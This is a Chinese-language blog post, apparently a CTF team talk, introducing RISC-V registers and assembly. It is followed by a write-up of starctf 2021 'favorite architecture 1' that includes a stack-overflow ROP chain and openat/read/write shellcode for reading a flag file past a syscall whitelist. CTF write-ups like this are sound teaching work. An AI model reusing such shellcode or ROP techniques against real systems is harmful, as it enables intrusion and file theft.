<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"121.36.2.124","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Garen Wang&#39;s Blog">
<meta property="og:url" content="https://121.36.2.124/index.html">
<meta property="og:site_name" content="Garen Wang&#39;s Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Garen Wang">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://121.36.2.124/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Garen Wang's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Garen Wang's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="Searching..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://121.36.2.124/2021/03/27/First-Presentation-in-Kap0k/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Garen Wang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Garen Wang's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/27/First-Presentation-in-Kap0k/" class="post-title-link" itemprop="url">First Presentation in Kap0k</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2021-03-27 10:37:33 / Modified: 11:48:36" itemprop="dateCreated datePublished" datetime="2021-03-27T10:37:33+08:00">2021-03-27</time>
            </span>

          
            <span id="/2021/03/27/First-Presentation-in-Kap0k/" class="post-meta-item leancloud_visitors" data-flag-title="First Presentation in Kap0k" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2021/03/27/First-Presentation-in-Kap0k/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2021/03/27/First-Presentation-in-Kap0k/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="RISC-V的分享"><a href="#RISC-V的分享" class="headerlink" title="RISC-V的分享"></a>RISC-V的分享</h1><p>讲一讲RISC-V的内容吧，最近跟着一个跟RISC-V有关的开源项目玩了一下，对RISC-V有最基本的了解，就分享一下吧。</p>
<p>第一次做队内分享，讲的不对的话请大哥们指正。</p>
<h2 id="RISC-V了解"><a href="#RISC-V了解" class="headerlink" title="RISC-V了解"></a>RISC-V了解</h2><p><del>在qemu编译的时候写一写，等啊等</del></p>
<p>RISC-V作为PC端和嵌入式设备的新架构，不像x86那样有沉重的历史包袱，相比更加的精简与现代化。</p>
<p>去年华为专场的那场CTF就有挺多RISC-V方面的pwn题，了解了不亏。</p>
<p>RISC-V是大势所趋（逃</p>
<p><a target="_blank" rel="noopener" href="https://metalcode.eu/2019-12-06-rv32i.html">RISC-V Cheat Sheet</a></p>
<h3 id="RISC-V的寄存器"><a href="#RISC-V的寄存器" class="headerlink" title="RISC-V的寄存器"></a>RISC-V的寄存器</h3><img data-src="http://qiniu.garen-wang.cn/static/images/First-Presentation-in-Kap0k/riscv.png">
<p>RISC-V的寄存器有32个，从<code>x0</code>到<code>x31</code>。根据官方的调用规范，各寄存器有以下的性质：</p>
<ul>
<li><p><code>zero(x0)</code>是特殊的寄存器，任何时候值都为0。</p>
</li>
<li><p><code>ra(x1)</code>储存返回地址，在函数调用过程中会时常变化。caller saved</p>
</li>
<li><p><code>sp(x2)</code>相当于x86的<code>rsp/esp</code>，储存栈顶地址。callee saved</p>
</li>
<li><p><code>gp(x3)</code>和<code>tp(x4)</code>这两个寄存器很特殊，程序运行过程都不会变化，作用嘛，我想想……</p>
</li>
<li><p><code>a0(x10)-a7(x17)</code>是储存当前调用函数参数的寄存器。特别地：<code>a0</code>类似<code>rax</code>，储存返回值，<code>a7</code>传syscall的调用号。</p>
</li>
<li><p><code>pc</code>即program counter。</p>
</li>
<li><p><code>t1-t6</code>，是caller saved的temp寄存器。</p>
</li>
<li><p><code>s1-s11</code>，是callee saved的temp寄存器。</p>
</li>
</ul>
<h3 id="RISC-V汇编语句"><a href="#RISC-V汇编语句" class="headerlink" title="RISC-V汇编语句"></a>RISC-V汇编语句</h3><p><del>还在等toolchain的编译，忘开多进程了</del></p>
<p>在RISC-V中，想控制寄存器</p>
<p>由于汇编语句很多，并且存在很多伪指令（类似高级程序语言概念中的语法糖？），就只列举出重要的出来讲吧。</p>
<p><code>%hi(x)</code>和<code>%lo(x)</code>分别表示取<code>x</code>寄存器的高地址和低地址。</p>
<p><code>lb t0, 8(sp)</code>跟<code>sb t0, 8(sp)</code>是对称的，分别是读取内存储存到寄存器和读取寄存器恢复内存原始状态。</p>
<p>如何实现函数调用时的跳转？有两条汇编指令非常常用：</p>
<script type="math/tex; mode=display">{jal \qquad r_d,\quad  imm[20:1]}</script><script type="math/tex; mode=display">{jalr \quad r_d, \quad (imm[11:0])r_s}</script><p>作用是在$r_d$上保存下当前栈帧的<code>ra</code>，然后<code>pc</code>会跳转到与<code>pc</code>或者$r_s$的offset为$imm$的地址处。</p>
<p>而当函数要跳转回来时，相似地有<code>ret</code>的伪指令，这条指令会被认为是<code>jalr x0, 0(x1)</code>。</p>
<p>{ % qnimg First-Presentation-in-Kap0k/prologue_and_epilogue.png %}</p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/64211181/whats-the-difference-between-caller-saved-and-callee-saved-in-risc-v">关于caller saved和callee saved的细节讨论</a></p>
<p>找到<a target="_blank" rel="noopener" href="https://web.eecs.utk.edu/~smarz1/courses/ece356/notes/assembly/">一篇不错的文章</a>，不懂的时候查一查就可以了。</p>
<h3 id="RISC-V实例"><a href="#RISC-V实例" class="headerlink" title="RISC-V实例"></a>RISC-V实例</h3><p>随便写了个类似helloworld的东西，拿到的<code>helloworld.s</code>，可以分析一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">.file	&quot;helloworld.c&quot;</span><br><span class="line">	.option nopic</span><br><span class="line">	.text</span><br><span class="line">	.section	.rodata</span><br><span class="line">	.align	3</span><br><span class="line">.LC0:</span><br><span class="line">	.string	&quot;Helloworld, %d&quot;</span><br><span class="line">	.text</span><br><span class="line">	.align	1</span><br><span class="line">	.globl	helloworld</span><br><span class="line">	.type	helloworld, @function</span><br><span class="line">helloworld:</span><br><span class="line">  # prologue</span><br><span class="line">	addi	sp,sp,-32</span><br><span class="line">	sd	ra,24(sp)</span><br><span class="line">	sd	s0,16(sp)</span><br><span class="line"></span><br><span class="line">  # main part</span><br><span class="line">	addi	s0,sp,32</span><br><span class="line">	mv	a5,a0 # source of second parameter</span><br><span class="line">	sw	a5,-20(s0)</span><br><span class="line">	lw	a5,-20(s0)</span><br><span class="line">	mv	a1,a5 # second parameter</span><br><span class="line">	lui	a5,%hi(.LC0)</span><br><span class="line">	addi	a0,a5,%lo(.LC0) # first parameter</span><br><span class="line">	call	printf</span><br><span class="line">	nop</span><br><span class="line"></span><br><span class="line">  # epilogue</span><br><span class="line">	ld	ra,24(sp)</span><br><span class="line">	ld	s0,16(sp)</span><br><span class="line">	addi	sp,sp,32</span><br><span class="line">	jr	ra</span><br><span class="line">	.size	helloworld, .-helloworld</span><br><span class="line">	.section	.rodata</span><br><span class="line">	.align	3</span><br><span class="line">.LC1:</span><br><span class="line">	.string	&quot;%d&quot;</span><br><span class="line">	.text</span><br><span class="line">	.align	1</span><br><span class="line">	.globl	main</span><br><span class="line">	.type	main, @function</span><br><span class="line">main:</span><br><span class="line">  # prologue of main</span><br><span class="line">	addi	sp,sp,-32</span><br><span class="line">	sd	ra,24(sp)</span><br><span class="line">	sd	s0,16(sp)</span><br><span class="line"></span><br><span class="line">  # main part</span><br><span class="line">	addi	s0,sp,32</span><br><span class="line">	addi	a5,s0,-20</span><br><span class="line">	mv	a1,a5 # second parameter: address of x</span><br><span class="line">	lui	a5,%hi(.LC1)</span><br><span class="line">	addi	a0,a5,%lo(.LC1) # first parameter: &quot;helloworld, %d&quot;</span><br><span class="line">	call	__isoc99_scanf</span><br><span class="line">	lw	a5,-20(s0)</span><br><span class="line">	mv	a0,a5 # first parameter: address of x</span><br><span class="line">	call	helloworld</span><br><span class="line">	li	a5,0 # clear a5</span><br><span class="line">	mv	a0,a5 # clear a0</span><br><span class="line"></span><br><span class="line">  # epilogue of main</span><br><span class="line">	ld	ra,24(sp)</span><br><span class="line">	ld	s0,16(sp)</span><br><span class="line">	addi	sp,sp,32</span><br><span class="line">	jr	ra</span><br><span class="line">	.size	main, .-main</span><br><span class="line">	.ident	&quot;GCC: (GNU) 10.2.0&quot;</span><br><span class="line">	.section	.note.GNU-stack,&quot;&quot;,@progbits</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="RISC-V环境配置"><a href="#RISC-V环境配置" class="headerlink" title="RISC-V环境配置"></a>RISC-V环境配置</h2><p>Ubuntu 18.04中可以配置RISC-V GNU Toolchain，内含RISCV架构下的<code>gcc</code>、<code>gdb</code>、<code>as</code>、<code>ld</code>、<code>readelf</code>等必不可少的工具。</p>
<p>同时当然也需要安装qemu，方便运行RV64的二进制文件。</p>
<p>有趣的是：以上的工具都需要编译安装，所需时间稍长。建议make的时候手动把进程拉满。</p>
<h2 id="例题：starctf-2021-pwn-amp-re-favorite-architecture"><a href="#例题：starctf-2021-pwn-amp-re-favorite-architecture" class="headerlink" title="例题：starctf 2021 pwn&amp;re favorite architecture"></a>例题：starctf 2021 pwn&amp;re favorite architecture</h2><h3 id="favorite-architecture-1"><a href="#favorite-architecture-1" class="headerlink" title="favorite architecture 1"></a>favorite architecture 1</h3><p>有个patch挺重要的，要先看一看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">diff --git a&#x2F;linux-user&#x2F;syscall.c b&#x2F;linux-user&#x2F;syscall.c</span><br><span class="line">index 27adee9..2d75464 100644</span><br><span class="line">--- a&#x2F;linux-user&#x2F;syscall.c</span><br><span class="line">+++ b&#x2F;linux-user&#x2F;syscall.c</span><br><span class="line">@@ -13101,8 +13101,31 @@ abi_long do_syscall(void *cpu_env, int num, abi_long arg1,</span><br><span class="line">         print_syscall(cpu_env, num, arg1, arg2, arg3, arg4, arg5, arg6);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">-    ret &#x3D; do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,</span><br><span class="line">-                      arg5, arg6, arg7, arg8);</span><br><span class="line">+    switch (num) &#123;</span><br><span class="line">+        &#x2F;&#x2F; syscall whitelist</span><br><span class="line">+        case TARGET_NR_brk:</span><br><span class="line">+        case TARGET_NR_uname:</span><br><span class="line">+        case TARGET_NR_readlinkat:</span><br><span class="line">+        case TARGET_NR_faccessat:</span><br><span class="line">+        case TARGET_NR_openat2:</span><br><span class="line">+        case TARGET_NR_openat:</span><br><span class="line">+        case TARGET_NR_read:</span><br><span class="line">+        case TARGET_NR_readv:</span><br><span class="line">+        case TARGET_NR_write:</span><br><span class="line">+        case TARGET_NR_writev:</span><br><span class="line">+        case TARGET_NR_mmap:</span><br><span class="line">+        case TARGET_NR_munmap:</span><br><span class="line">+        case TARGET_NR_exit:</span><br><span class="line">+        case TARGET_NR_exit_group:</span><br><span class="line">+        case TARGET_NR_mprotect:</span><br><span class="line">+            ret &#x3D; do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,</span><br><span class="line">+                    arg5, arg6, arg7, arg8);</span><br><span class="line">+            break;</span><br><span class="line">+        default:</span><br><span class="line">+            printf(&quot;[!] %d bad system call\n&quot;, num);</span><br><span class="line">+            ret &#x3D; -1;</span><br><span class="line">+            break;</span><br><span class="line">+    &#125;</span><br><span class="line"> </span><br><span class="line">     if (unlikely(qemu_loglevel_mask(LOG_STRACE))) &#123;</span><br><span class="line">         print_syscall_ret(cpu_env, num, ret, arg1, arg2,</span><br></pre></td></tr></table></figure>
<p>意思就是过滤了RISC-V的syscall指令，只剩下这几个让你用，没有<code>execve</code>。</p>
<p>checksec一下<code>main</code>文件，保护几乎都关了，ASLR也没有。是静态链接的二进制文件。</p>
<p>反编译打开，搜一下跟”flag”有关的字符串，定位main函数。</p>
<p><img data-src="you_are.png" alt></p>
<p>结果发现符号表没了，不能正常地得到编译结果，只能看到汇编。</p>
<p>在博客上找到一种解决方法：</p>
<blockquote>
<p>反编译出现 unknown error 时得手动改 gp 为 0x6f178（ctrl-A → ctrl-R → 找到gp寄存器并修改）(感谢@X1do0发现的解决方案)</p>
</blockquote>
<p>在哪里找得到？在0x101ec可以看见：</p>
<p><img data-src="get_gp.png" alt></p>
<p>得到的主函数反编译结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">undefined8 <span class="title">UndefinedFunction_00010400</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  ulonglong uVar1;</span><br><span class="line">  longlong lVar2;</span><br><span class="line">  undefined auStack488 [<span class="number">192</span>];</span><br><span class="line">  undefined auStack296 [<span class="number">256</span>];</span><br><span class="line">  ulonglong uStack40;</span><br><span class="line">  longlong lStack32;</span><br><span class="line">  <span class="keyword">int</span> iStack20;<span class="comment">// cnt</span></span><br><span class="line">  </span><br><span class="line">  FUN_00017d74(PTR_DAT_0006ea28,<span class="number">0</span>);<span class="comment">// setvbuf</span></span><br><span class="line">  FUN_00017d74(PTR_DAT_0006ea20,<span class="number">0</span>);<span class="comment">// setvbuf</span></span><br><span class="line">  FUN_00017d74(PTR_DAT_0006ea18,<span class="number">0</span>);<span class="comment">// setvbuf</span></span><br><span class="line">  FUN_0001605a(<span class="string">&quot;Input the flag: &quot;</span>);<span class="comment">// output</span></span><br><span class="line">  FUN_00016a5a(auStack296);<span class="comment">// read your input</span></span><br><span class="line">  uVar1 = FUN_000204e4(auStack296);<span class="comment">// get string</span></span><br><span class="line">  <span class="keyword">if</span> (uVar1 == ((longlong)(iRam000000000006e9dc + iRam000000000006e9d8) &amp; <span class="number">0xffffffff</span>U)) &#123;</span><br><span class="line">    lStack32 = FUN_00020386(auStack296 + ((longlong)iRam000000000006e9d8 &amp; <span class="number">0xffffffff</span>));</span><br><span class="line">    FUN_0001118a(auStack488,<span class="string">&quot;tzgkwukglbslrmfjsrwimtwyyrkejqzo&quot;</span>,<span class="string">&quot;oaeqjfhclrqk&quot;</span>,<span class="number">0x80</span>);</span><br><span class="line">    FUN_000111ea(auStack488,auStack296,iRam000000000006e9d8);</span><br><span class="line">    lVar2 = FUN_00020e2a(auStack296,&amp;DAT_0006d000,iRam000000000006e9d8);</span><br><span class="line">    <span class="keyword">if</span> (lVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">      uStack40 = FUN_000204e4(lStack32);</span><br><span class="line">      iStack20 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (uStack40 &gt;&gt; <span class="number">3</span> &lt;= (ulonglong)(longlong)iStack20) &#123;</span><br><span class="line">          FUN_00016bc8(<span class="string">&quot;You are right :D&quot;</span>);<span class="comment">// output</span></span><br><span class="line">          gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        FUN_000102ae(iStack20 * <span class="number">8</span> + lStack32,&amp;DAT_0006d060);</span><br><span class="line">        lVar2 = FUN_00020e2a(iStack20 * <span class="number">8</span> + lStack32,(longlong)(iStack20 * <span class="number">8</span>) + <span class="number">0x6d030</span>,<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">if</span> (lVar2 != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        iStack20 = iStack20 + <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  FUN_00016bc8(<span class="string">&quot;You are wrong ._.&quot;</span>);<span class="comment">// output</span></span><br><span class="line">  gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实读入部分就是一个栈溢出，就有很多解法，既可以写shellcode，也可以写ROP。</p>
<p>RISC-V下的syscall跟x86的还是不一样，具体<a target="_blank" rel="noopener" href="https://github.com/westerndigitalcorporation/RISC-V-Linux/blob/master/riscv-pk/pk/syscall.h">看表</a>。</p>
<p>如果用ROP打的话，ret2csu在rv64也是很好用的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">00011772 93 07 84 b8     addi       a5,s0,-0x478</span><br><span class="line">00011776 13 09 09 b9     addi       s2,s2,-0x470</span><br><span class="line">0001177a 33 09 f9 40     sub        s2,s2,a5</span><br><span class="line">0001177e 13 59 39 40     srai       s2,s2,0x3</span><br><span class="line">00011782 63 0e 09 00     beq        s2,zero,LAB_0001179e</span><br><span class="line">00011786 13 04 84 b8     addi       s0,s0,-0x478</span><br><span class="line">0001178a 81 44           c.li       s1,0x0</span><br><span class="line">                     LAB_0001178c                                    XREF[1]:     0001179a(j)  </span><br><span class="line">0001178c 1c 60           c.ld       a5&#x3D;&gt;-&gt;FUN_00010284,0x0(s0&#x3D;&gt;-&gt;FUN_00010250)       &#x3D; 00010284</span><br><span class="line">                                                                                     &#x3D; 00010250</span><br><span class="line">0001178e 56 86           c.mv       a2,s5</span><br><span class="line">00011790 d2 85           c.mv       a1,s4</span><br><span class="line">00011792 4e 85           c.mv       a0,s3</span><br><span class="line">00011794 85 04           c.addi     s1,0x1</span><br><span class="line">00011796 82 97           c.jalr     a5&#x3D;&gt;FUN_00010284                                 undefined FUN_00010250()</span><br><span class="line">                                                                                     undefined FUN_00010284()</span><br><span class="line">00011798 21 04           c.addi     s0,0x8</span><br><span class="line">0001179a e3 19 99 fe     bne        s2,s1,LAB_0001178c</span><br><span class="line">                     LAB_0001179e                                    XREF[1]:     00011782(j)  </span><br><span class="line">0001179e e2 70           c.ldsp     ra,0x38(sp)</span><br><span class="line">000117a0 42 74           c.ldsp     s0,0x30(sp)</span><br><span class="line">000117a2 a2 74           c.ldsp     s1,0x28(sp)</span><br><span class="line">000117a4 02 79           c.ldsp     s2,0x20(sp)</span><br><span class="line">000117a6 e2 69           c.ldsp     s3,0x18(sp)</span><br><span class="line">000117a8 42 6a           c.ldsp     s4,0x10(sp)</span><br><span class="line">000117aa a2 6a           c.ldsp     s5,0x8(sp)</span><br><span class="line">000117ac 21 61           c.addi16sp sp,0x40</span><br><span class="line">000117ae 82 80           ret</span><br></pre></td></tr></table></figure>
<p>因为代码是一样的，只是在架构层面不同，大体思路跟x86下利用是差不多的，不过还是有些差别。</p>
<ol>
<li>第一条ROP：0x1179e。控制s0为gets + 0x478，控制s2为gets + 0x470，控制ra为0x11772。</li>
<li>执行完ret后跳到第二条ROP：0x11772。通过第一步的构造我们能够满足0x11782的beq条件成立，直接跳转到0x1179e。</li>
<li>第三条ROP：0x1179e。控制s3为bss地址，s1为0，s2为1，ra为0x1178e。</li>
<li>执行完ret后调到第四条ROP：0x1178e。a0为bss地址，s1=0+1=1=s2，满足0x11796的跳转条件，执行<code>gets(bss_addr)</code>。</li>
</ol>
<p>同时shellcode也同样可行，主要的思路是运用三个RISC-V下的系统调用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.globl _start</span><br><span class="line">.option rvc</span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">  li a1,0x67616c66 #flag</span><br><span class="line">  sd a1,8(sp)</span><br><span class="line">  addi a1,sp,8</span><br><span class="line">  li a0,-100</span><br><span class="line">  li a2,0</span><br><span class="line">  li a7, 56 # 56: openat</span><br><span class="line">  ecall</span><br><span class="line">	</span><br><span class="line">  c.mv a2,a7</span><br><span class="line">  addi a7,a7,7 # 63: read</span><br><span class="line">  ecall</span><br><span class="line">  li a0, 1</span><br><span class="line">  addi a7,a7,1 # 64: write</span><br><span class="line">  ecall</span><br><span class="line"></span><br><span class="line">$ riscv64-unknown-linux-gnu-as shellcode.s -o shellcode</span><br><span class="line">$ riscv64-unknown-linux-gnu-objcopy -S -o binary -j .text shellcode shellcode.bin</span><br></pre></td></tr></table></figure>
<p>这三个系统调用都在白名单里面，写好shellcode直接注入即可。</p>
<h3 id="favourite-architecture-2"><a href="#favourite-architecture-2" class="headerlink" title="favourite architecture 2"></a>favourite architecture 2</h3><p>第一次接触这种qemu沙箱逃逸的题目，看了好多师傅的博客，终于差不多看懂了，做一下记录。</p>
